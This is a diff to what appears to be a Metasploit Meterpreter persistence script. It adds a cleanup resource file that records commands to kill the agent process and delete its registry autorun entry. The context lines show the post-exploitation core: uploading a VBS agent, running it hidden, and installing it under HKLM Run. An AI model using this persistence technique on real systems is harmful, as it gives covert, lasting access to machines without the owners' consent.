@@ -50,6 +50,29 @@ opts.parse(args) do |opt, idx, val|
 	end
 end
 
+host_name = client.sys.config.sysinfo['Computer']
+# Create Filename info to be appended to downloaded files
+filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
+
+# Create a directory for the logs
+logs = ::File.join(Msf::Config.log_directory, 'persistence', host_name + filenameinfo )
+
+# Create the log directory
+::FileUtils.mkdir_p(logs)
+
+# Cleaup script file name
+dest = logs + "/clean_up_" + filenameinfo + ".rc"
+
+#Writes a given string to a file specified
+def fs_filewrt(file2wrt, data2wrt)
+	output = ::File.open(file2wrt, "a")
+	if data2wrt
+		data2wrt.each_line do |d|
+			output.puts(d)
+		end
+	end
+	output.close
+end
 #
 # Create the persistent VBS
 #
@@ -81,7 +104,7 @@ print_status("Uploaded the persistent agent to #{tempvbs}")
 #
 proc = session.sys.process.execute("wscript \"#{tempvbs}\"", nil, {'Hidden' => true})
 print_status("Agent executed with PID #{proc.pid}")
-
+fs_filewrt(dest, "kill #{proc.pid}\n")
 #
 # Setup the multi/handler if requested
 #
@@ -110,8 +133,9 @@ if(install)
 	if(key)
 		key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
 		print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+		fs_filewrt(dest, "reg deleteval -k \'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\' -v #{nam}\n")
 	else
 		print_status("Error: failed to open the registry key for writing")
 	end
 end
-
+print_status("For cleanup use command: run multi_console_command -s #{dest}")
